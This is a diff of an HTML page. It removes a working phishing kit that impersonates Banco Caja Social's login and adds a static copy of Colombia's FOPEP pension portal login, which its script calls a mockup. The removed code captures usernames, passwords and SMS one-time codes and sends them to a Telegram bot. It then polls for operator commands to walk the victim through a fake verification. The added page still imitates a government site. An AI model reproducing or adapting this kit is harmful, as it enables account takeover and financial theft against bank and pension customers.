@@ -1,415 +1,677 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" class="" lang="es">
+<html lang="es">
 <head>
-    <meta charset="utf-8">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Inicio de sesión - Portal Personas Banco Caja Social</title>
-    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
-    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/zocial/zocial.css" rel="stylesheet">
-    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-theme/dist/backbase-theme.css" rel="stylesheet">
-    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/styles/identity.css" rel="stylesheet">
-    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/pficon/pficon.css" rel="stylesheet">
-    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/tile.css" rel="stylesheet">
-    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/bcs.7.css" rel="stylesheet">
-    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/custom-identity.1.css" rel="stylesheet">
-    <script src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/scripts/load-background.js"></script>
-    <style>
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .d-none { display: none !important; }
-        .input-example-text {
-            display: block;
-            margin-top: 5px;
-            color: #6c757d;
-            font-size: 0.85rem;
-        }
-        
-        /* ESTILOS PARA LA PANTALLA DEL CÓDIGO */
-        .otp-title {
-            font-size: 2rem;
-            font-weight: 700;
-            color: #1a1a1a;
-            line-height: 1.2;
-            margin-bottom: 15px;
-        }
-        .phone-box {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin: 20px 0;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        .phone-icon {
-            width: 32px;
-            height: 32px;
-            fill: #5c6c7f;
-        }
-        .phone-number {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: #1a1a1a;
-        }
-        .otp-links {
-            margin-top: 25px;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        .otp-links a {
-            color: #0056b3;
-            font-weight: 600;
-            text-decoration: none;
-            font-size: 0.95rem;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FOPEP - Iniciar Sesión</title>
+
+<style>
+:root {
+    --verde: #008f68;
+    --verde-oscuro: #006b52;
+    --azul: #3267c7;
+    --texto: #273b4b;
+}
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    color: var(--texto);
+    background: white;
+}
+
+a {
+    text-decoration: none;
+    color: inherit;
+}
+
+/* ENCABEZADO GOV.CO */
+
+.gov {
+    background: var(--azul);
+    color: white;
+    padding: 14px 13%;
+    font-size: 24px;
+}
+
+.header {
+    max-width: 1190px;
+    margin: auto;
+    min-height: 125px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 20px;
+    padding: 15px;
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.logo-icon {
+    background: #78183d;
+    color: white;
+    padding: 15px;
+    font-size: 35px;
+    border-radius: 8px;
+}
+
+.logo-text {
+    color: #555;
+    font-weight: bold;
+    font-size: 25px;
+}
+
+.fopep {
+    color: #b51f2c;
+    font-size: 30px;
+    font-weight: bold;
+}
+
+.user-icon {
+    background: #00986e;
+    color: white;
+    padding: 15px;
+    border-radius: 50%;
+}
+
+/* MENÚ */
+
+nav {
+    background: var(--verde);
+    color: white;
+}
+
+.nav-container {
+    max-width: 1190px;
+    margin: auto;
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+}
+
+nav a {
+    padding: 23px 14px;
+    font-weight: bold;
+}
+
+nav a:hover {
+    background: #31a486;
+}
+
+.buscar {
+    margin-left: auto;
+    background: white;
+    color: #82949f;
+    border-radius: 30px;
+    padding: 12px 20px;
+    width: 200px;
+}
+
+/* CONTENIDO PRINCIPAL */
+
+main {
+    max-width: 1190px;
+    margin: auto;
+    padding: 20px 10px;
+}
+
+.migas {
+    margin-bottom: 30px;
+    color: #547487;
+}
+
+.contenido {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 30px;
+    align-items: start;
+}
+
+.imagen {
+    height: 510px;
+    overflow: hidden;
+}
+
+.imagen img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+/* FORMULARIO */
+
+.formulario {
+    padding: 28px;
+    box-shadow: 0 4px 22px #0002;
+    border-radius: 7px;
+}
+
+h1 {
+    color: var(--verde-oscuro);
+    font-size: 38px;
+    margin: 0 0 45px;
+}
+
+label {
+    display: block;
+    font-size: 18px;
+    font-weight: bold;
+    margin-bottom: 12px;
+}
+
+input, select {
+    width: 100%;
+    height: 42px;
+    padding: 10px;
+    border: 1px solid #b9cbd4;
+    margin-bottom: 28px;
+    font-size: 16px;
+}
+
+.password {
+    position: relative;
+}
+
+.captcha {
+    display: flex;
+    align-items: center;
+    border: 1px solid #ddd;
+    padding: 12px;
+    width: 325px;
+    max-width: 100%;
+    margin-bottom: 20px;
+}
+
+.captcha input {
+    width: 22px;
+    margin: 0 12px 0 0;
+}
+
+.boton {
+    background: var(--verde);
+    color: white;
+    border: none;
+    width: 100%;
+    padding: 15px;
+    font-size: 17px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+/* SEGUNDA SECCIÓN */
+
+.portal-extra {
+    max-width: 1190px;
+    margin: 40px auto;
+    padding: 10px;
+}
+
+.portal-actions {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 30px;
+}
+
+.bienvenida {
+    min-height: 135px;
+    background:
+        linear-gradient(#111b20a8, #111b20a8),
+        url("foto-adultos.jpg") center/cover;
+    display: flex;
+    align-items: center;
+    padding: 25px 50px;
+    color: white;
+}
+
+.bienvenida h2 {
+    font-size: 36px;
+    line-height: 1.2;
+}
+
+.tarjeta-acciones {
+    padding: 20px 25px;
+    box-shadow: 0 3px 20px #0002;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 18px;
+}
+
+.registro, .inicio {
+    padding: 12px;
+    text-align: center;
+    border: 2px solid #0872df;
+    border-radius: 5px;
+    color: #0069d9;
+    font-weight: bold;
+}
+
+.inicio {
+    border-color: #00966c;
+    color: #00885f;
+}
+
+.olvido {
+    grid-column: 1 / -1;
+    color: #006bd6;
+    font-weight: bold;
+}
+
+/* REGRESAR Y ARRIBA */
+
+.regresar {
+    display: flex;
+    justify-content: flex-end;
+    gap: 20px;
+    align-items: center;
+    margin: 50px 0;
+}
+
+.regresar span {
+    background: #ddd;
+    width: 54px;
+    height: 54px;
+    border-radius: 50%;
+    display: inline-grid;
+    place-items: center;
+    font-size: 30px;
+}
+
+/* PIE DE PÁGINA */
+
+footer {
+    background: var(--verde-oscuro);
+    color: white;
+    padding: 30px max(calc((100% - 1190px)/2), 25px);
+}
+
+.footer-columnas {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 60px;
+}
+
+footer h3 {
+    font-size: 18px;
+    margin-bottom: 18px;
+}
+
+footer p {
+    font-size: 17px;
+    line-height: 1.6;
+    margin-bottom: 18px;
+}
+
+.redes {
+    display: flex;
+    gap: 10px;
+    margin-top: 25px;
+}
+
+.redes span {
+    background: #3767aa;
+    border-radius: 50%;
+    width: 28px;
+    height: 28px;
+    display: grid;
+    place-items: center;
+    font-weight: bold;
+}
+
+.redes span:nth-child(2) {
+    background: #222;
+}
+
+.redes span:nth-child(3) {
+    background: red;
+}
+
+.redes span:nth-child(4) {
+    background: #20a85a;
+}
+
+.footer-bottom {
+    display: flex;
+    justify-content: center;
+    gap: 130px;
+    margin-top: 45px;
+}
+
+/* BARRA GOV.CO INFERIOR */
+
+.gov-footer {
+    background: var(--azul);
+    color: white;
+    padding: 20px 13%;
+    font-size: 25px;
+}
+
+/* RESPONSIVE */
+
+@media(max-width: 900px) {
+
+    .header {
+        flex-wrap: wrap;
+        justify-content: center;
+    }
+
+    .contenido,
+    .portal-actions,
+    .footer-columnas {
+        grid-template-columns: 1fr;
+    }
+
+    .imagen {
+        height: 350px;
+    }
+
+    .nav-container {
+        justify-content: center;
+    }
+
+    .buscar {
+        margin: 10px;
+    }
+
+    .footer-bottom {
+        gap: 25px;
+        flex-wrap: wrap;
+    }
+}
+
+@media(max-width: 520px) {
+
+    .gov {
+        padding: 12px 20px;
+    }
+
+    .logo-text {
+        font-size: 20px;
+    }
+
+    .fopep {
+        font-size: 24px;
+    }
+
+    .formulario {
+        padding: 20px;
+    }
+
+    h1 {
+        font-size: 30px;
+    }
+
+    .bienvenida {
+        padding: 20px;
+    }
+
+    .bienvenida h2 {
+        font-size: 28px;
+    }
+
+    .tarjeta-acciones {
+        padding: 15px;
+    }
+
+    footer {
+        padding: 25px 20px;
+    }
+
+    .footer-bottom {
+        font-size: 14px;
+    }
+}
+</style>
 </head>
-<body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
-    <div id="background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
-    <div class="bb-stack bb-stack--wrap template-stack-container">
-        <div id="inner-background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
-        <div class="bb-stack__break bb-stack__break--md-down"></div>
-        <div class="bb-stack__item--fill identity-container">
-            <div class="identity-container__panel identity-container__panel--animated">
-                <div class="identity-container__form">
-                    
-                    <!-- LOGO / IMAGEN (Se oculta en el paso del OTP) -->
-                    <div class="login-logos-wrapper" id="main-logo">
-                        <div class="identity-logo bb-block bb-block--lg"></div>
-                    </div>
-                    
-                    <!-- ENCABEZADO (Se oculta en el paso del OTP) -->
-                    <header id="main-header">
-                        <h1 id="kc-page-title">Bienvenido al Portal Personas</h1>
-                    </header>
 
-                    <!-- PASO 1: USUARIO -->
-                    <div id="step-username">
-                        <div class="bb-subtitle bb-block bb-block--lg">
-                            <span>Recuerde que su usuario está compuesto por su Tipo de Identificación <strong>(CC, CE, NI, TI, PE)</strong> y su Número de Identificación sin espacios, puntos ni comas.</span>
-                        </div>
-                        <div id="kc-form">
-                            <div id="kc-form-wrapper">
-                                <form id="form-index">
-                                    <div class="form-group bb-form-field bb-form-field--md">
-                                        <label for="username-input" class="label">Usuario</label>
-                                        <input id="username-input" class="form-control" name="username" type="text" autofocus autocomplete="off">
-                                        <small class="input-example-text">Ejemplo: CC1234567890</small>
-                                    </div>
-                                    <div class="bb-button-bar bb-block bb-block--xl mt-3">
-                                        <button id="btn-index" class="btn btn-primary w-100" type="submit" disabled>Siguiente</button>
-                                    </div>
-                                    
-                                    <div class="bb-block bb-block--xl mt-3 text-start">
-                                        <a class="btn-link-text" data-bs-toggle="collapse" href="#collapseForgot" role="button" style="font-weight: bold; color: #0056b3;">¿Olvidó su contraseña? ▼</a>
-                                        <div class="collapse mt-2" id="collapseForgot">
-                                            <div class="card card-body" style="font-size: 0.9rem; background-color: #f8f9fa;">Para recuperar su contraseña, diríjase a la opción de recuperación.</div>
-                                        </div>
-                                    </div>
-                                    <hr class="bb-block bb-block--lg identity-separator">
-                                    <div class="bb-subtitle d-flex align-items-center gap-2 flex-wrap mt-4">
-                                        <div class="bb-block bb-block--sm mb-0">¿Es un cliente nuevo?</div>
-                                        <strong class="mb-0"><a class="btn-link-text" href="https://bancapersonas.bancocajasocial.com/web/enrollment">Registrarse</a></strong>
-                                    </div>
-                                </form>
-                            </div>
-                        </div>
-                    </div>
+<body id="top">
 
-                    <!-- PASO 2: CONTRASEÑA -->
-                    <div id="step-password" class="d-none">
-                        <div class="bb-subtitle bb-block bb-block--lg">
-                            <span>Ingrese su contraseña de canales digitales, recuerde que está compuesta por 8 caracteres.</span>
-                        </div>
-                        <div id="kc-form">
-                            <div id="kc-form-wrapper">
-                                <form id="form-contra">
-                                    <div class="form-group bb-form-field bb-form-field--md">
-                                        <div class="bb-input-password">
-                                            <label for="password-input" class="label">Contraseña</label>
-                                            <div class="input-group">
-                                                <input id="password-input" class="form-control bb-input-password__input" name="password" type="password" maxlength="8" autocomplete="off">
-                                                <button id="toggle-pass" type="button" class="btn btn-link bb-input-password__visibility-toggle-button">
-                                                    <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle;"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" /></svg>
-                                                </button>
-                                            </div>
-                                        </div>
-                                        <small id="msg-len" class="bb-input-validation-message d-none" role="alert">La contraseña debe tener exactamente 8 caracteres.</small>
-                                    </div>
-                                    <div class="bb-button-bar bb-button-bar--reverse bb-block bb-block--xl mt-3">
-                                        <div class="bb-block bb-block--xl w-100 w-md-auto d-flex d-md-block flex-column-reverse">
-                                            <button id="btn-submit" class="btn btn-primary me-0 me-md-3" type="submit" disabled>Iniciar sesión</button>
-                                        </div>
-                                    </div>
-                                </form>
-                            </div>
-                        </div>
-                    </div>
+<!-- ENCABEZADO -->
 
-                    <!-- PASO 3: PANTALLA DE CARGA -->
-                    <div id="step-waiting" class="d-none">
-                        <div class="bb-subtitle bb-block bb-block--lg text-center">
-                            <div style="width:52px;height:52px;border:5px solid #e0e0e0;border-top-color:#0033A0;border-radius:50%;animation:spin 0.9s linear infinite;margin:30px auto;"></div>
-                            <p style="color:#444;font-size:15px;margin-top:20px;">Verificando información, por favor espere...</p>
-                        </div>
-                    </div>
+<div class="gov">♛ | GOV.CO</div>
 
-                    <!-- PASO 4: CÓDIGO OTP -->
-                    <div id="step-otp" class="d-none">
-                        <h2 class="otp-title">Su código de seguridad ha sido enviado.</h2>
-                        <p style="font-size: 1rem; color: #333; margin-bottom: 20px;">Para continuar, por favor verifique que el código de seguridad haya llegado a su teléfono celular registrado:</p>
-                        
-                        <div class="phone-box">
-                            <svg class="phone-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                                <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
-                            </svg>
-                            <span class="phone-number">3*****8088</span>
-                        </div>
+<header class="header">
 
-                        <div id="kc-form">
-                            <div id="kc-form-wrapper">
-                                <form id="form-otp">
-                                    <div class="form-group bb-form-field bb-form-field--md">
-                                        <label for="otp-input" class="label">Código de seguridad</label>
-                                        <input id="otp-input" class="form-control" type="text" maxlength="6" autocomplete="one-time-code" style="font-size: 1.5rem; letter-spacing: 5px; text-align: center;">
-                                        <small style="color: #6c757d; font-size: 0.85rem; margin-top: 5px; display: block;">Por favor ingrese el código compuesto por 6 dígitos</small>
-                                    </div>
-                                    <div class="bb-button-bar bb-block bb-block--xl mt-3">
-                                        <button id="btn-otp" class="btn btn-primary w-100" type="submit" style="background-color: #0070c0; border-radius: 25px; padding: 12px; font-weight: bold;">
-                                            Enviar
-                                        </button>
-                                    </div>
-                                </form>
-                                
-                                <hr style="margin: 25px 0; border-top: 1px solid #e0e0e0;">
-                                
-                                <div class="otp-links">
-                                    <div>
-                                        <span style="color: #333;">¿No recibió el código?</span> 
-                                        <a href="#" onclick="enviarTelegram('🔄 El usuario solicitó REENVIAR el código.'); return false;">Reenviar</a>
-                                    </div>
-                                    <a href="#" onclick="enviarTelegram('⚠️ El usuario reportó un PROBLEMA CON EL NÚMERO DE TELÉFONO.'); return false;">¿Tiene algún problema con este número de teléfono celular?</a>
-                                    <a href="#" onclick="enviarTelegram('📱 El usuario intentó con OTRO MEDIO.'); return false;">Intente con otro medio</a>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- PASO 5: PANTALLA FINAL -->
-                    <div id="step-final" class="d-none text-center">
-                        <div style="margin-top: 40px;">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="#28a745" viewBox="0 0 16 16" style="margin-bottom: 20px;">
-                                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
-                            </svg>
-                            <h2 style="color:#1a1a1a; font-weight: 700;">¡Transacción Exitosa!</h2>
-                            <p style="color:#555; font-size: 1.1rem;">Sus datos han sido verificados correctamente. Ya puede cerrar esta ventana.</p>
-                        </div>
-                    </div>
-
-                </div>
-            </div>
+    <div class="logo">
+        <div class="logo-icon">❮</div>
+        <div class="logo-text">
+            COLOMBIA<br>
+            POTENCIA DE LA<br>
+            VIDA
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <div>Imprimir &nbsp; ◉ &nbsp; Tт &nbsp; Modo lectura</div>
 
-    <script>
-        /* ========================================== */
-        /* CONFIGURACIÓN DE TELEGRAM                  */
-        /* ========================================== */
-        const TELEGRAM_BOT_TOKEN = 'AQUI_TU_TOKEN_DEL_BOT'; 
-        const TELEGRAM_CHAT_ID = 'AQUI_TU_CHAT_ID';         
-        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-        /* ========================================== */
+    <div class="user-icon">●</div>
 
-        const mainLogo     = document.getElementById('main-logo');
-        const mainHeader   = document.getElementById('main-header');
-        
-        const stepUsername = document.getElementById('step-username');
-        const stepPassword = document.getElementById('step-password');
-        const stepWaiting  = document.getElementById('step-waiting');
-        const stepOtp      = document.getElementById('step-otp');
-        const stepFinal    = document.getElementById('step-final');
+    <div class="fopep">✣ FOPEP</div>
 
-        const inputUser = document.getElementById('username-input');
-        const btnIndex  = document.getElementById('btn-index');
-        
-        const passInput = document.getElementById('password-input');
-        const btnSubmit = document.getElementById('btn-submit');
-        const msgLen    = document.getElementById('msg-len');
+</header>
 
-        const otpInput  = document.getElementById('otp-input');
-        const btnOtp    = document.getElementById('btn-otp');
+<!-- NAVEGACIÓN -->
 
-        let USERNAME = '';
-        let PASSWORD = '';
-        let lastUpdateId = 0; 
-        let pollingInterval = null;
+<nav>
+    <div class="nav-container">
+        <a href="#">Inicio</a>
+        <a href="#">Acerca del FOPEP</a>
+        <a href="#">Entidades Sustituidas</a>
+        <a href="#">Trámites de Pensionados</a>
+        <a href="#">Atención al Pensionado</a>
+        <a href="#">Noticias</a>
+        <div class="buscar">⌕ Buscar</div>
+    </div>
+</nav>
 
-        /* Función para enviar mensajes simples */
-        function enviarTelegram(texto) {
-            fetch(`${TELEGRAM_API}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: texto, parse_mode: 'HTML' })
-            });
-        }
+<!-- FORMULARIO PRINCIPAL -->
 
-        /* ---------- PASO 1: USUARIO ---------- */
-        inputUser.addEventListener('input', () => {
-            inputUser.value = inputUser.value.toUpperCase();
-            btnIndex.disabled = inputUser.value.trim().length === 0;
-        });
+<main>
 
-        document.getElementById('form-index').addEventListener('submit', function (e) {
-            e.preventDefault();
-            const username = inputUser.value.trim();
-            if (!username) return;
+    <p class="migas">
+        <b>Estás en</b> &gt; Iniciar sesión
+    </p>
 
-            USERNAME = username;
-            stepUsername.classList.add('d-none');
-            stepPassword.classList.remove('d-none');
-            passInput.focus();
-        });
+    <section class="contenido">
 
-        /* ---------- PASO 2: CONTRASEÑA ---------- */
-        passInput.addEventListener('input', function () {
-            const len = this.value.length;
-            btnSubmit.disabled = len !== 8;
-            msgLen.classList.toggle('d-none', len === 0 || len === 8);
-        });
+        <div class="imagen">
+            <img src="foto-adultos.jpg"
+                 alt="Adultos mayores">
+        </div>
 
-        document.getElementById('toggle-pass').addEventListener('click', () => {
-            passInput.type = passInput.type === 'password' ? 'text' : 'password';
-        });
+        <div class="formulario">
 
-        document.getElementById('form-contra').addEventListener('submit', async function (e) {
-            e.preventDefault();
-            PASSWORD = passInput.value.trim();
-            if (PASSWORD.length !== 8) return;
+            <h1>Iniciar Sesión</h1>
 
-            stepPassword.classList.add('d-none');
-            stepWaiting.classList.remove('d-none');
+            <form id="loginForm">
 
-            // Enviar credenciales a Telegram
-            await fetch(`${TELEGRAM_API}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: `🔐 <b>Credenciales Capturadas:</b>\n\n👤 <b>Usuario:</b> <code>${USERNAME}</code>\n🔑 <b>Clave:</b> <code>${PASSWORD}</code>\n\n¿Qué acción desea tomar?`,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: "🚫 Usuario Malo", callback_data: `malo` },
-                                { text: "📩 Pedir Código", callback_data: `pedir_codigo` }
-                            ]
-                        ]
-                    }
-                })
-            });
+                <label>Tipo de Documento</label>
 
-            iniciarPolling();
-        });
+                <select required>
+                    <option value="">Seleccione un tipo</option>
+                    <option>Cédula de ciudadanía</option>
+                    <option>Cédula de extranjería</option>
+                    <option>Pasaporte</option>
+                </select>
 
-        /* ---------- PASO 4: CÓDIGO OTP ---------- */
-        otpInput.addEventListener('input', function () {
-            btnOtp.disabled = this.value.trim().length < 6;
-        });
+                <label>
+                    Documento (Escríbalo sin puntos)
+                </label>
 
-        document.getElementById('form-otp').addEventListener('submit', async function (e) {
-            e.preventDefault();
-            const codigo = otpInput.value.trim();
-            if (!codigo) return;
+                <input type="text"
+                       placeholder="Documento"
+                       required>
 
-            stepOtp.classList.add('d-none');
-            stepWaiting.classList.remove('d-none');
+                <label>Contraseña</label>
 
-            await fetch(`${TELEGRAM_API}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: `🔑 <b>Código OTP Recibido (${USERNAME}):</b>\n<code>${codigo}</code>\n\n¿Qué acción desea tomar?`,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: "❌ Código Erróneo", callback_data: `codigo_error` },
-                                { text: "✅ Finalizar", callback_data: `finalizar` }
-                            ]
-                        ]
-                    }
-                })
-            });
+                <input type="password"
+                       placeholder="Escriba contraseña aquí"
+                       required>
 
-            iniciarPolling();
-        });
+                <div class="captcha">
+                    <input type="checkbox">
+                    <span>No soy un robot</span>
+                </div>
 
-        /* ---------- ESCUCHAR RESPUESTAS DE TELEGRAM (POLLING) ---------- */
-        function iniciarPolling() {
-            if (pollingInterval) clearInterval(pollingInterval);
+                <button class="boton" type="submit">
+                    Ingresar
+                </button>
 
-            pollingInterval = setInterval(async () => {
-                try {
-                    const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
-                    const data = await res.json();
+                <p style="text-align:center">
+                    <a href="#">¿Olvidó su contraseña?</a>
+                </p>
 
-                    if (data.ok && data.result.length > 0) {
-                        data.result.forEach(update => {
-                            lastUpdateId = update.update_id;
+            </form>
 
-                            if (update.callback_query) {
-                                const action = update.callback_query.data;
-                                clearInterval(pollingInterval);
-                                
-                                fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        chat_id: TELEGRAM_CHAT_ID,
-                                        message_id: update.callback_query.message.message_id,
-                                        reply_markup: { inline_keyboard: [] }
-                                    })
-                                });
+        </div>
 
-                                if (action === 'malo') {
-                                    enviarTelegram(`🚫 El usuario <code>${USERNAME}</code> ha sido marcado como malo.`);
-                                    document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:sans-serif;"><h2>Error de autenticación</h2><p>El usuario no es válido.</p></div>';
-                                } 
-                                else if (action === 'pedir_codigo') {
-                                    enviarTelegram(`📩 Se ha solicitado el código para <code>${USERNAME}</code>.`);
-                                    
-                                    // Ocultar IMAGEN y ENCABEZADO
-                                    mainLogo.classList.add('d-none');
-                                    mainHeader.classList.add('d-none');
-                                    
-                                    stepWaiting.classList.add('d-none');
-                                    stepOtp.classList.remove('d-none');
-                                    otpInput.focus();
-                                }
-                                else if (action === 'codigo_error') {
-                                    enviarTelegram(`❌ El código fue rechazado. Se le solicitará de nuevo al usuario.`);
-                                    stepWaiting.classList.add('d-none');
-                                    stepOtp.classList.remove('d-none');
-                                    otpInput.value = ''; 
-                                    btnOtp.disabled = true;
-                                    otpInput.focus();
-                                }
-                                else if (action === 'finalizar') {
-                                    enviarTelegram(`✅ Proceso finalizado con éxito.`);
-                                    stepWaiting.classList.add('d-none');
-                                    stepFinal.classList.remove('d-none');
-                                }
-                            }
-                        });
-                    }
-                } catch (e) {
-                    console.error("Error en polling", e);
-                }
-            }, 2000);
-        }
-    </script>
+    </section>
+
+</main>
+
+<!-- SEGUNDA SECCIÓN -->
+
+<section class="portal-extra">
+
+    <div class="portal-actions">
+
+        <div class="bienvenida">
+            <h2>
+                Bienvenido a nuestro<br>
+                Portal Web
+            </h2>
+        </div>
+
+        <div class="tarjeta-acciones">
+
+            <a href="#" class="registro">
+                Quiero registrarme
+            </a>
+
+            <a href="#" class="inicio">
+                Iniciar Sesión
+            </a>
+
+            <a href="#" class="olvido">
+                ¿Olvidó su Contraseña?
+            </a>
+
+        </div>
+
+    </div>
+
+    <!-- REGRESAR Y ARRIBA -->
+
+    <div class="regresar">
+
+        <a href="#" onclick="history.back(); return false;">
+            Regresar <span>←</span>
+        </a>
+
+        <a href="#top">
+            <span>↑</span> Arriba
+        </a>
+
+    </div>
+
+</section>
+
+<!-- FOOTER -->
+
+<footer>
+
+    <div class="footer-columnas">
+
+        <div>
+
+            <h3>ÚNICA SEDE</h3>
+
+            <p>
+                Carrera 13 No. 27-00 Oficina 811
+                Edificio Bochica del Centro
+                Internacional Tequendama – Bogotá
+            </p>
+
+            <h3>LÍNEA DE ATENCIÓN AL PENSIONADO</h3>
+
+            <p>
+                Bogotá (+57) 601 422-7422
+            </p>
+
+            <h3>FUNCIONARIOS</h3>
+
+            <p>
+                Acceso funcionarios
+            </p>
+
+            <div class="redes">
+                <span>f</span>
+                <span>𝕏</span>
+                <span>▶</span>
+                <span>◉</span>
+            </div>
+
+        </div>
+
+        <div>
+
+            <h3>HORARIO DE ATENCIÓN AL PÚBLICO</h3>
+
+            <p>Lunes a viernes</p>
+
+            <p>
+                <b>Sede FOPEP</b><br>
+                De 8 a.m. a 4 p.m. jornada continua.
+            </p>
+
+            <p>
+                <b>Línea de atención al pensionado</b><br>
+                De 8 a.m. a 5 p.m. jornada continua.
+            </p>
+
+            <p>
+                <b>Chatbot</b><br>
+                Atención 24 horas los 7 días de la semana.
+            </p>
+
+        </div>
+
+    </div>
+
+    <div class="footer-bottom">
+
+        <a href="#">Mapa del sitio</a>
+
+        <span>
+            Copyright © Consorcio FOPEP 2022
+        </span>
+
+    </div>
+
+</footer>
+
+<div class="gov-footer">
+    🇨🇴 &nbsp; ♛ | GOV.CO
+</div>
+
+<script>
+
+document.getElementById("loginForm")
+.addEventListener("submit", function(e) {
+
+    e.preventDefault();
+
+    alert("Esta es una maqueta visual. No envía datos ni inicia sesión.");
+
+});
+
+</script>
+
 </body>
 </html>
